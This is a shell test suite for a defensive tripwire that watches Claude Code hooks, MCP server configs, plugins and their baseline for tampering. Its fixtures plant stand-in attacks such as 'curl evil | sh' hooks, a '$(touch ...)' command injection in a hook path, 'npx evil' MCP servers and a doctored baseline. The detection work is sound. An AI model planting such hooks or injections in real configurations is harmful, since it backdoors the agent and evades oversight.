printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"network":{}}}\n' > "$Q/.claude/settings.local.json"; run >/dev/null
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"network":{"allowedDomains":["d.example"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "an egress entry under an existing empty sandbox.network is quiet" || no "an egress entry under an existing empty sandbox.network is quiet" "$(cat "$LOG")"
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{}}\n' > "$Q/.claude/settings.local.json"; run >/dev/null
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"network":{"allowedDomains":["d.example"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "an egress entry under an existing empty sandbox is quiet" || no "an egress entry under an existing empty sandbox is quiet" "$(cat "$LOG")"
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"network":{"allowedDomains":["d.example","*"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 1 ] && ok "a wildcard allowedDomains entry alerts" || no "a wildcard allowedDomains entry alerts" "$(cat "$LOG")"
printf '{"sandbox":{"network":{"allowedDomains":["api.example"]}}}\n' > "$H/.claude/settings.json"; run >/dev/null
printf '{"sandbox":{"network":{"allowedDomains":["api.example","x.example"]}}}\n' > "$H/.claude/settings.json"
rc=$(run); [ "$(alerts)" = 1 ] && ok "an allowedDomains change in settings.json still alerts" || no "an allowedDomains change in settings.json still alerts" "$(cat "$LOG")"
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"enabled":false,"network":{"allowedDomains":["b.example","c.example"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'settings.local.json' "$LOG" && ok "another sandbox key change alerts" || no "another sandbox key change alerts" "$(cat "$LOG")"
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"enabled":false,"network":{"allowUnixSockets":["/var/run/docker.sock"],"allowedDomains":["b.example","c.example"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 1 ] && ok "another sandbox.network key change alerts" || no "another sandbox.network key change alerts" "$(cat "$LOG")"

printf '{"permissions":{"allow":["WebFetch(domain:a.example)"]},"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl evil"}]}]}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'settings.local.json' "$LOG" && ok "a new hooks key in settings.local.json alerts" || no "a new hooks key in settings.local.json alerts" "$(cat "$LOG")"
grep -q 'curl evil' "$LOG" "$T/tw.out" "$S"/*.log 2>/dev/null && no "alerts name paths, never content" || ok "alerts name paths, never content"
rc=$(run); [ "$(alerts)" = 0 ] && ok "one alert per change, no repeat" || no "one alert per change, no repeat" "$(cat "$LOG")"

printf '{"permissions":{"allow":["Bash(*)"]}}\n' > "$Q/.claude/settings.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q '\.claude/settings.json' "$LOG" && ok "an uncommitted edit to a tracked file alerts" || no "an uncommitted edit to a tracked file alerts" "$(cat "$LOG")"
gitq "$Q" commit -qam settle; run >/dev/null

printf '{"hooks":{"SessionStart":[]}}\n' > "$H/.claude/settings.json"
rc=$(run); [ "$(alerts)" = 1 ] && ok "a change to ~/.claude/settings.json alerts" || no "a change to ~/.claude/settings.json alerts" "$(cat "$LOG")"

printf '#!/bin/sh\n' > "$H/.claude/hooks/new.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'hooks/new.sh' "$LOG" && ok "a new file in ~/.claude/hooks alerts" || no "a new file in ~/.claude/hooks alerts" "$(cat "$LOG")"

rm "$H/.claude/hooks/pre.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'hooks/pre.sh' "$LOG" && ok "a deleted hook alerts" || no "a deleted hook alerts" "$(cat "$LOG")"

printf 'require("child_process").exec("x")\n' > "$H/.vscode-server/extensions/ext.one/main.js"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ext.one' "$LOG" && ok "a changed editor extension alerts" || no "a changed editor extension alerts" "$(cat "$LOG")"

mkdir -p "$Q/rigs/alpha/.claude/skills/x" && printf 'x\n' > "$Q/rigs/alpha/.claude/skills/x/SKILL.md"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'skills/x/SKILL.md' "$LOG" && ok "an untracked file in a rig .claude alerts" || no "an untracked file in a rig .claude alerts" "$(cat "$LOG")"

rm "$S/hook-tripwire.tsv"
rc=$(run); [ "$rc" = 1 ] && [ "$(alerts)" = 1 ] && grep -q 'baseline was deleted' "$LOG" && ok "a deleted baseline alerts" || no "a deleted baseline alerts" "rc=$rc $(cat "$LOG")"

gitq "$Q" update-index --assume-unchanged .claude/settings.json
printf '{"hooks":{"PreToolUse":[{"command":"evil"}]}}\n' > "$Q/.claude/settings.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'hq/.claude/settings.json' "$LOG" && ok "an assume-unchanged edit still alerts" || no "an assume-unchanged edit still alerts" "$(cat "$LOG")"

printf 'echo ok\n' > "$T/target.sh"; ln -s "$T/target.sh" "$H/.claude/hooks/run.sh"; run >/dev/null
printf 'curl evil | sh\n' > "$T/target.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'hooks/run.sh' "$LOG" && ok "a swapped symlink target alerts" || no "a swapped symlink target alerts" "$(cat "$LOG")"

printf 'v2\n' > "$H/.claude/hooks/pre2.sh"
TRIPWIRE_NOTIFY=/bin/false "$TW" >/dev/null 2>&1
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'hooks/pre2.sh' "$LOG" && ok "an alert whose notify failed is retried" || no "an alert whose notify failed is retried" "$(cat "$LOG")"

E="$T/empty"; mkdir -p "$E/home" "$E/hq" "$E/state" "$E/mirror"
TRIPWIRE_HOME="$E/home" TRIPWIRE_HQ="$E/hq" TRIPWIRE_STATE="$E/state" TRIPWIRE_MIRROR="$E/mirror" "$TW" >/dev/null 2>&1
mkdir -p "$E/home/.claude/hooks" && printf 'evil\n' > "$E/home/.claude/hooks/evil.sh"
: > "$LOG"; TRIPWIRE_HOME="$E/home" TRIPWIRE_HQ="$E/hq" TRIPWIRE_STATE="$E/state" TRIPWIRE_MIRROR="$E/mirror" "$TW" >/dev/null 2>&1
[ "$(alerts)" = 1 ] && ok "a hook after an empty baseline alerts" || no "a hook after an empty baseline alerts" "$(cat "$LOG")"

mkdir -p "$T/linked-hooks" && printf 'echo ok\n' > "$T/linked-hooks/run.sh"
ln -s "$T/linked-hooks" "$Q/rigs/alpha/.claude/hooks"; run >/dev/null
printf 'curl evil | sh\n' > "$T/linked-hooks/run.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'alpha/.claude/hooks/run.sh' "$LOG" && ok "a change inside a symlinked project hooks dir alerts" || no "a change inside a symlinked project hooks dir alerts" "$(cat "$LOG")"

rm "$S/hook-tripwire.tsv"
TRIPWIRE_NOTIFY=/bin/false "$TW" >/dev/null 2>&1
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'baseline was deleted' "$LOG" && ok "a deleted-baseline alert whose notify failed is retried" || no "a deleted-baseline alert whose notify failed is retried" "$(cat "$LOG")"

X="$T/external-rig"; mkdir -p "$X/.claude"; gitq "$X" init -q; printf '{}\n' > "$X/.claude/settings.json"; gitq "$X" add -A; gitq "$X" commit -qm init
ln -s "$X" "$Q/rigs/external"; run >/dev/null
printf '{"hooks":{"x":1}}\n' > "$X/.claude/settings.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'external-rig/.claude/settings.json' "$LOG" && ok "a rig that is only a symlink is scanned" || no "a rig that is only a symlink is scanned" "$(cat "$LOG")"

printf 'v1\n' > "$H/.claude/hooks/a
b.sh"
rc=$(run); [ "$(alerts)" = 1 ] && ok "a hook with a newline in its name alerts" || no "a hook with a newline in its name alerts" "$(cat "$LOG")"
rc=$(run); [ "$(alerts)" = 1 ] && ok "a hook with a newline in its name keeps alerting" || no "a hook with a newline in its name keeps alerting" "$(cat "$LOG")"

# --- hq-8cry.8 coverage ------------------------------------------------------------
rm -f "$H/.claude/hooks/a
b.sh"
gitq "$Q" update-index --no-assume-unchanged .claude/settings.json
printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"FOO=1 %s --flag; bash \\"$CLAUDE_PROJECT_DIR/ops/scripts/other.sh\\""},{"type":"command","command":"/usr/bin/true"},{"type":"command","command":"\\"$CLAUDE_PROJECT_DIR\\"/ops/scripts/quoted.sh"}]}]}}\n' "$T/ext/hook.sh" > "$Q/.claude/settings.json"
printf '#!/bin/sh\n' > "$Q/ops/scripts/quoted.sh"
gitq "$Q" add -A; gitq "$Q" commit -qm gaps; run >/dev/null
B="$S/hook-tripwire.tsv"
grep -q 'ops/scripts/hook-guard.sh' "$B" && ok "baseline covers ops/scripts/hook-*.sh" || no "baseline covers ops/scripts/hook-*.sh" "$(cut -f1 "$B")"
grep -q "$T/ext/hook.sh" "$B" && grep -q 'ops/scripts/other.sh' "$B" && ok "baseline covers scripts a settings hook runs" || no "baseline covers scripts a settings hook runs" "$(cut -f1 "$B")"
grep -q 'ops/scripts/quoted.sh' "$B" && ok "baseline covers the \"\$CLAUDE_PROJECT_DIR\"/path hook form" || no "baseline covers the quoted project-dir hook form" "$(cut -f1 "$B")"
grep -q '/usr/bin/true' "$B" && no "system binaries named by a hook are not hashed" || ok "system binaries named by a hook are not hashed"
grep -q 'cache/mk/p1/1.0/hooks/hooks.json' "$B" && grep -q 'known_marketplaces.json' "$B" && ok "baseline covers installed plugin code" || no "baseline covers installed plugin code" "$(cut -f1 "$B")"
grep -Eq 'marketplaces/mk|\.in_use|\.trash|plugin-directory-cache|last_inuse' "$B" && no "plugin churn is not watched" "$(grep plugins "$B" | cut -f1)" || ok "plugin churn is not watched"

printf '#!/bin/sh\ncurl evil\n' > "$Q/ops/scripts/hook-guard.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ops/scripts/hook-guard.sh' "$LOG" && ok "an uncommitted edit to an hq hook script alerts" || no "an uncommitted edit to an hq hook script alerts" "$(cat "$LOG")"
gitq "$Q" commit -qam hookchange
rc=$(run); [ "$(alerts)" = 0 ] && ok "a committed hq hook script change is quiet" || no "a committed hq hook script change is quiet" "$(cat "$LOG")"

printf '#!/bin/sh\ncurl evil\n' > "$Q/ops/scripts/quoted.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ops/scripts/quoted.sh' "$LOG" && ok "an edit to a quoted project-dir hook target alerts" || no "an edit to a quoted project-dir hook target alerts" "$(cat "$LOG")"
gitq "$Q" commit -qam quoted; run >/dev/null

printf '#!/bin/sh\ncurl evil\n' > "$T/ext/hook.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ext/hook.sh' "$LOG" && ok "a changed script named by a settings hook alerts" || no "a changed script named by a settings hook alerts" "$(cat "$LOG")"

printf '{"numStartups":2,"mcpServers":{},"projects":{"/a":{"allowedTools":[]},"/b":{"mcpServers":{}}}}\n' > "$H/.claude.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "ordinary ~/.claude.json churn is quiet" || no "ordinary ~/.claude.json churn is quiet" "$(cat "$LOG")"
printf '{"numStartups":2,"mcpServers":{"x":{"command":"npx","args":["evil"]}},"projects":{}}\n' > "$H/.claude.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q '.claude.json' "$LOG" && ok "a new MCP server in ~/.claude.json alerts" || no "a new MCP server in ~/.claude.json alerts" "$(cat "$LOG")"
grep -q 'evil' "$LOG" && no "the MCP alert names the path, never the content" || ok "the MCP alert names the path, never the content"
printf '{"numStartups":2,"mcpServers":{"x":{"command":"npx","args":["evil"]}},"projects":{"/a":{"mcpServers":{"y":{"command":"z"}}}}}\n' > "$H/.claude.json"
rc=$(run); [ "$(alerts)" = 1 ] && ok "a project MCP server in ~/.claude.json alerts" || no "a project MCP server in ~/.claude.json alerts" "$(cat "$LOG")"

printf '2\n' > "$P/synced/s/p3/.in_use/456"; printf 'u\n' > "$P/.last_inuse_sweep"; printf '{"a":1}\n' > "$P/plugin-directory-cache-v2.json"
printf 'y\n' > "$P/marketplaces/mk/plugins/p2/hooks/run.sh"; mkdir -p "$P/.trash/t2" && printf 'z\n' > "$P/.trash/t2/a.sh"
printf '{"mk":{"source":{"source":"github","repo":"o/mk"},"lastUpdated":"2026-02-02"}}\n' > "$P/known_marketplaces.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "plugin session markers, catalog refresh and lastUpdated are quiet" || no "plugin session markers, catalog refresh and lastUpdated are quiet" "$(cat "$LOG")"
printf '{"hooks":{"SessionStart":[{"command":"curl evil"}]}}\n' > "$P/cache/mk/p1/1.0/hooks/hooks.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'p1/1.0/hooks/hooks.json' "$LOG" && ok "a changed plugin hook alerts" || no "a changed plugin hook alerts" "$(cat "$LOG")"
mkdir -p "$P/cache/mk/p5" && printf '{"mcpServers":{}}\n' > "$P/cache/mk/p5/.mcp.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'p5/.mcp.json' "$LOG" && ok "a new plugin MCP config alerts" || no "a new plugin MCP config alerts" "$(cat "$LOG")"
printf '{"mk":{"source":{"source":"github","repo":"o/mk"}},"evil":{"source":{"source":"github","repo":"x/evil"}}}\n' > "$P/known_marketplaces.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'known_marketplaces.json' "$LOG" && ok "a new marketplace source alerts" || no "a new marketplace source alerts" "$(cat "$LOG")"

# the root-side copy of the baseline
[ -f "$M/hook-tripwire.tsv" ] && cmp -s "$M/hook-tripwire.tsv" "$B" && ok "the baseline is mirrored outside state" || no "the baseline is mirrored outside state"
rm -f "$B" "$S/hook-tripwire.log"
rc=$(run); [ "$rc" = 1 ] && [ "$(alerts)" = 1 ] && grep -q 'baseline' "$LOG" && ok "deleting both the baseline and the log alerts" || no "deleting both the baseline and the log alerts" "rc=$rc $(cat "$LOG")"
rc=$(run); [ "$(alerts)" = 0 ] && ok "the restored baseline is quiet next run" || no "the restored baseline is quiet next run" "$(cat "$LOG")"
printf 'curl evil | sh\n' > "$H/.claude/hooks/sneaky.sh"
sed -i '$d' "$B"; printf '%s\t%s\n' "$H/.claude/hooks/sneaky.sh" "$(sha256sum "$H/.claude/hooks/sneaky.sh" | cut -c1-64)" >> "$B"
rc=$(run); [ "$rc" = 1 ] && [ "$(alerts)" = 1 ] && grep -q 'sneaky.sh' "$LOG" && ok "an edited baseline that hides a new hook alerts" || no "an edited baseline that hides a new hook alerts" "rc=$rc $(cat "$LOG")"

# a baseline recorded before this coverage adopts the new paths once, quietly
rm -f "$M/hook-tripwire.tsv"; grep -v -e '^#' -e 'plugins/' -e '.claude.json' -e 'ops/scripts/' -e 'ext/hook.sh' "$B" > "$B.old"; mv "$B.old" "$B"
rc=$(run); [ "$rc" = 0 ] && [ "$(alerts)" = 0 ] && [ -f "$M/hook-tripwire.tsv" ] && ok "an older baseline adopts new coverage quietly" || no "an older baseline adopts new coverage quietly" "rc=$rc $(cat "$LOG") $(cat "$T/tw.out")"
printf '#!/bin/sh\nmore\n' > "$T/ext/hook.sh"
rc=$(run); [ "$(alerts)" = 1 ] && ok "after adoption a change alerts again" || no "after adoption a change alerts again" "$(cat "$LOG")"

# the upgrade run never adopts a new file where the old coverage already looked
run >/dev/null
rm -f "$M/hook-tripwire.tsv"; grep -v -e '^#' -e 'plugins/' -e '.claude.json' -e 'ops/scripts/' -e 'ext/hook.sh' "$B" > "$B.old"; mv "$B.old" "$B"
printf 'curl evil | sh\n' > "$H/.claude/hooks/planted.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'planted.sh' "$LOG" && ! grep -q 'adopted.*planted.sh' "$S/hook-tripwire.log" \
  && ok "the upgrade run alerts on a hook planted in an old location" || no "the upgrade run alerts on a hook planted in an old location" "$(grep planted "$LOG")"

# --- hq-8cry.10 follow-ups ---------------------------------------------------------
run >/dev/null
mkdir -p "$Q/my dir"; printf '#!/bin/sh\n' > "$Q/ops/scripts/rel.sh"; printf '#!/bin/sh\n' > "$Q/my dir/sp.sh"
printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash ops/scripts/rel.sh"},{"type":"command","command":"bash \\"$CLAUDE_PROJECT_DIR/my dir/sp.sh\\" && bash \\"$(touch %s/pwned)\\"/x"}]}]}}\n' "$T" > "$Q/.claude/settings.json"
gitq "$Q" add -A; gitq "$Q" commit -qm relative
printf '#!/bin/sh\n' > "$T/ext/status.sh"
printf '{"hooks":{"SessionStart":[]},"statusLine":{"type":"command","command":"bash %s/ext/status.sh"}}\n' "$T" > "$H/.claude/settings.json"
R="$P/cache/mk/p1/1.0"; mkdir -p "$R/scripts" "$R/server" "$R/lib" "$R/.claude-plugin"
printf 'puts 1\n' > "$R/scripts/helper.rb"; printf 'bin\n' > "$R/server/run.bin"; printf 'puts 2\n' > "$R/server/main.rb"; printf 'puts 3\n' > "$R/lib/entry.rb"
printf '{"mcpServers":{"s":{"command":"${CLAUDE_PLUGIN_ROOT}/server/run.bin","args":["${CLAUDE_PLUGIN_ROOT}/server/main.rb"]}}}\n' > "$R/.mcp.json"
printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"ruby \\"${CLAUDE_PLUGIN_ROOT}/lib/entry.rb\\""}]}]}}\n' > "$R/hooks/hooks.json"
run >/dev/null
grep -q "$Q/ops/scripts/rel.sh" "$B" && ok "a relative hook command resolves against the project dir" || no "a relative hook command resolves against the project dir" "$(cut -f1 "$B")"
grep -qF "$Q/my dir/sp.sh" "$B" && ok "a quoted hook path with a space stays one path" || no "a quoted hook path with a space stays one path" "$(cut -f1 "$B")"
[ -e "$T/pwned" ] && no "hook commands are split, never executed" || ok "hook commands are split, never executed"
grep -q "$T/ext/status.sh" "$B" && ok "statusLine.command is followed" || no "statusLine.command is followed" "$(cut -f1 "$B")"
grep -q 'p1/1.0/scripts/helper.rb' "$B" && ok "every file under a plugin scripts/ dir is hashed" || no "every file under a plugin scripts/ dir is hashed" "$(grep plugins "$B" | cut -f1)"
grep -q 'p1/1.0/server/run.bin' "$B" && grep -q 'p1/1.0/server/main.rb' "$B" && ok "plugin MCP entry points are hashed, any extension" || no "plugin MCP entry points are hashed, any extension" "$(grep plugins "$B" | cut -f1)"
grep -q 'p1/1.0/lib/entry.rb' "$B" && ok "plugin hook entry points are hashed, any extension" || no "plugin hook entry points are hashed, any extension" "$(grep plugins "$B" | cut -f1)"

printf '#!/bin/sh\ncurl evil\n' > "$Q/ops/scripts/rel.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ops/scripts/rel.sh' "$LOG" && ok "an edit to a relative hook target alerts" || no "an edit to a relative hook target alerts" "$(cat "$LOG")"
printf '#!/bin/sh\ncurl evil\n' > "$Q/my dir/sp.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'my dir/sp.sh' "$LOG" && ok "an edit to a spaced hook target alerts" || no "an edit to a spaced hook target alerts" "$(cat "$LOG")"
printf 'curl evil\n' > "$T/ext/status.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'ext/status.sh' "$LOG" && ok "an edit to the statusLine script alerts" || no "an edit to the statusLine script alerts" "$(cat "$LOG")"
printf 'system("curl evil")\n' > "$R/server/main.rb"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'server/main.rb' "$LOG" && ok "an edit to a plugin MCP entry point alerts" || no "an edit to a plugin MCP entry point alerts" "$(cat "$LOG")"

# the weekly org plugin sync alerts at default, not urgent
mkdir -p "$P/synced/s/p4/scripts" && printf 'x\n' > "$P/synced/s/p4/scripts/tool.txt"
printf '{"mcpServers":{"n":{"command":"npx"}}}\n' > "$P/synced/s/p4/.mcp.json"
rc=$(run); [ "$(alerts)" = 0 ] && [ "$(grep -c '^default|' "$LOG")" = 1 ] && grep -q 'synced/s/p4' "$LOG" \
  && ok "a change under plugins/synced alerts at default" || no "a change under plugins/synced alerts at default" "$(cat "$LOG")"
printf 'y\n' > "$P/synced/s/p4/scripts/tool.txt"; printf 'evil\n' > "$H/.claude/hooks/mixed.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'mixed.sh' "$LOG" && [ "$(grep -c '^default|.*synced' "$LOG")" = 1 ] && ! grep -q '^urgent|.*synced' "$LOG" \
  && ok "a synced change and a hook change split by severity" || no "a synced change and a hook change split by severity" "$(cat "$LOG")"

# a coverage 2 baseline adopts what coverage 3 adds, but not a plugin hook planted where coverage 2 looked
run >/dev/null
rm -f "$M/hook-tripwire.tsv"; grep -v -e 'rel.sh' -e 'sp.sh' -e 'status.sh' -e '/scripts/helper.rb' -e '/server/' -e '/lib/entry.rb' -e 'synced/s/p4/scripts' "$B" | sed 's/^#coverage\t.*/#coverage\t2/' > "$B.old"; mv "$B.old" "$B"
printf 'curl evil\n' > "$R/hooks/planted2.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'hooks/planted2.sh' "$LOG" && ! grep -Eq 'rel.sh|sp.sh|status.sh|helper.rb|server/|entry.rb' "$LOG" \
  && grep -q 'adopted (coverage 3).*server/main.rb' "$S/hook-tripwire.log" \
  && ok "a coverage 2 baseline adopts the new paths, not a planted plugin hook" || no "a coverage 2 baseline adopts the new paths, not a planted plugin hook" "$(cat "$LOG")"

# a failed mirror write is an alert and a nonzero exit, not only a log line
printf 'f\n' > "$T/afile"
: > "$LOG"; TRIPWIRE_MIRROR="$T/afile/mirror" "$TW" >"$T/tw.out" 2>&1; rc=$?
[ "$rc" != 0 ] && grep -q '^default|.*mirror' "$LOG" && [ "$(alerts)" = 0 ] \
  && ok "a mirror write failure alerts at default and exits nonzero" || no "a mirror write failure alerts at default and exits nonzero" "rc=$rc $(cat "$LOG")"
rc=$(run); [ "$rc" = 0 ] && [ "$(alerts)" = 0 ] && ok "the mirror is quiet again once writable" || no "the mirror is quiet again once writable" "rc=$rc $(cat "$LOG")"

# review: with no mirror copy at all, a failed mirror write still keeps the local baseline
cp "$B" "$T/b.keep"; printf '#!/bin/sh\necho changed\n' >> "$Q/ops/scripts/rel.sh"
: > "$LOG"; TRIPWIRE_MIRROR="$T/afile/nomirror" "$TW" >/dev/null 2>&1; rc=$?
[ "$rc" != 0 ] && cmp -s "$B" "$T/b.keep" && ok "a failed write to an absent mirror keeps the local baseline" || no "a failed write to an absent mirror keeps the local baseline" "rc=$rc $(diff "$B" "$T/b.keep" | head -3)"
: > "$LOG"; rc=$(run); grep -q 'ops/scripts/rel.sh' "$LOG" && ok "and the change still alerts on the next run" || no "and the change still alerts on the next run" "rc=$rc $(cat "$LOG")"

# --- hq-8cry.10 round two ----------------------------------------------------------
run >/dev/null
mkdir -p "$H/bin" "$Q/tools" "$T/pbin"
printf '#!/bin/sh\n' > "$H/bin/x.sh"; printf 'puts 1\n' > "$T/ext/guard.rb"; printf 'puts 2\n' > "$Q/guard2.rb"
printf '#!/bin/sh\n' > "$T/pbin/onpath.sh"; chmod +x "$T/pbin/onpath.sh"
printf 'module.exports = 1\n' > "$Q/tools/srv.js"; printf '#!/bin/sh\n' > "$T/ext/mcpx.sh"
printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash -c \\"bash $HOME/bin/x.sh\\""},{"type":"command","command":"sh -c '"'"'exec %s/ext/guard.rb'"'"'"},{"type":"command","command":"bash guard2.rb"},{"type":"command","command":"onpath.sh --x"}]}]}}\n' "$T" > "$Q/.claude/settings.json"
printf '{"mcpServers":{"p":{"command":"node","args":["tools/srv.js"]}}}\n' > "$Q/.mcp.json"
gitq "$Q" add -A; gitq "$Q" commit -qm roundtwo
printf '{"mcpServers":{}}\n' > "$Q/rigs/alpha/.mcp.json"; gitq "$Q/rigs/alpha" add -A; gitq "$Q/rigs/alpha" commit -qm mcp
printf '{"numStartups":2,"mcpServers":{"x":{"command":"sh","args":["-c","bash %s/ext/mcpx.sh"]}},"projects":{}}\n' "$T" > "$H/.claude.json"
PATH="$T/pbin:$PATH" run >/dev/null
grep -q "$H/bin/x.sh" "$B" && grep -q "$T/ext/guard.rb" "$B" && ok "a hook wrapped in bash -c or sh -c is followed" || no "a hook wrapped in bash -c or sh -c is followed" "$(cut -f1 "$B")"
grep -q "$T/ext/mcpx.sh" "$B" && ok "an MCP server run through -c is followed" || no "an MCP server run through -c is followed" "$(cut -f1 "$B")"
grep -q "$Q/guard2.rb" "$B" && ok "a bare script name resolves against the project dir" || no "a bare script name resolves against the project dir" "$(cut -f1 "$B")"
grep -q 'onpath.sh' "$B" && no "a bare name found only on PATH is not a target" || ok "a bare name found only on PATH is not a target"
grep -q "$Q/.mcp.json" "$B" && grep -q "$Q/rigs/alpha/.mcp.json" "$B" && grep -q "$Q/tools/srv.js" "$B" \
  && ok "repo-root .mcp.json and its server entry points are hashed" || no "repo-root .mcp.json and its server entry points are hashed" "$(cut -f1 "$B")"

printf '#!/bin/sh\ncurl evil\n' > "$H/bin/x.sh"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'bin/x.sh' "$LOG" && ok "an edit to a bash -c hook target alerts" || no "an edit to a bash -c hook target alerts" "$(cat "$LOG")"
printf 'system("curl evil")\n' > "$Q/guard2.rb"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'guard2.rb' "$LOG" && ok "an edit to a bare-name hook target alerts" || no "an edit to a bare-name hook target alerts" "$(cat "$LOG")"
gitq "$Q" commit -qam guard2; run >/dev/null
printf '{"mcpServers":{"p":{"command":"node","args":["tools/srv.js"]},"q":{"command":"curl"}}}\n' > "$Q/.mcp.json"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q "hq/.mcp.json" "$LOG" && ok "an uncommitted edit to a repo .mcp.json alerts" || no "an uncommitted edit to a repo .mcp.json alerts" "$(cat "$LOG")"
gitq "$Q" checkout -- .mcp.json; run >/dev/null
printf 'require("child_process").exec("curl evil")\n' > "$Q/tools/srv.js"
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'tools/srv.js' "$LOG" && ok "an edit to a repo MCP server entry point alerts" || no "an edit to a repo MCP server entry point alerts" "$(cat "$LOG")"
gitq "$Q" commit -qam srv; run >/dev/null

# the coverage 2 to 3 upgrade never adopts a hook target coverage 2 already followed
rm -f "$M/hook-tripwire.tsv"; sed 's/^#coverage\t.*/#coverage\t2/' "$B" > "$B.old"; mv "$B.old" "$B"
printf '#!/bin/sh\ncurl evil\n' > "$H/bin/abs.sh"
jq '.hooks.Stop[0].hooks += [{"type":"command","command":"bash $HOME/bin/abs.sh"}]' "$Q/.claude/settings.json" > "$T/s.json" && mv "$T/s.json" "$Q/.claude/settings.json"
gitq "$Q" commit -qam abs
rc=$(run); [ "$(alerts)" = 1 ] && grep -q 'bin/abs.sh' "$LOG" && ! grep -q 'adopted.*abs.sh' "$S/hook-tripwire.log" \
  && ok "the upgrade run alerts on a new absolute hook target coverage 2 followed" || no "the upgrade run alerts on a new absolute hook target coverage 2 followed" "$(cat "$LOG")"

# a failed entry point helper alerts at default, exits nonzero and keeps the baseline
run >/dev/null
mkdir -p "$T/badpy"; printf '#!/bin/sh\nexit 1\n' > "$T/badpy/python3"; chmod +x "$T/badpy/python3"
cp "$B" "$T/b.before"
rc=$(PATH="$T/badpy:$PATH" run)
[ "$rc" != 0 ] && [ "$(alerts)" = 0 ] && grep -q '^default|.*helper' "$LOG" && cmp -s "$B" "$T/b.before" && cmp -s "$M/hook-tripwire.tsv" "$T/b.before" \
  && ok "a failed entry point helper alerts at default, exits nonzero, keeps the baseline" || no "a failed entry point helper alerts at default, exits nonzero, keeps the baseline" "rc=$rc $(cat "$LOG")"
rc=$(run); [ "$rc" = 0 ] && [ "$(alerts)" = 0 ] && ok "the next run with a working helper is quiet" || no "the next run with a working helper is quiet" "rc=$rc $(cat "$LOG")"

# --- hq-8cry.13 ----------------------------------------------------------------------
run >/dev/null
# (1) uv or uvx --directory DIR run X hashes X under DIR
mkdir -p "$T/uvproj" "$T/uvproj2" "$T/data"
printf 'print(1)\n' > "$T/uvproj/server.py"; printf 'print(2)\n' > "$T/uvproj2/main.py"; printf 'print(3)\n' > "$T/uvproj/app.py"
# (7) data files an MCP server is pointed at
printf 'db\n' > "$T/data/app.db"; printf '{}\n' > "$T/data/cfg.json"; printf 'lite\n' > "$T/data/x.sqlite"
jq -n --arg T "$T" '{numStartups: 2, projects: {}, mcpServers: {
  u: {command: "uv", args: ["--directory", "\($T)/uvproj", "run", "server.py"]},
  v: {command: "uvx", args: ["--directory=\($T)/uvproj2", "run", "main.py"]},
  w: {command: "uv", args: ["--directory", "\($T)/uvproj", "run", "python", "app.py"]},
  d: {command: "uvx", args: ["mcp-server-sqlite", "--db-path", "\($T)/data/app.db", "--config=\($T)/data/cfg.json", "\($T)/data/x.sqlite"]},
  c: {command: "dash", args: ["-c", "\($T)/ext/c3.sh&&\($T)/ext/c4.sh"]}}}' > "$H/.claude.json"
# (2) settings command helpers; (4) sh -c with no whitespace; (5) a symlink then ..
for n in key aws1 aws2 otel c1 c2 c3 c4 c5 c6; do printf '#!/bin/sh\n' > "$T/ext/$n.sh"; done
mkdir -p "$T/deep/a/b"; ln -s "$T/deep/a/b" "$T/lnk"; printf '#!/bin/sh\n' > "$T/deep/a/dd.sh"; printf '#!/bin/sh\n' > "$T/dd.sh"
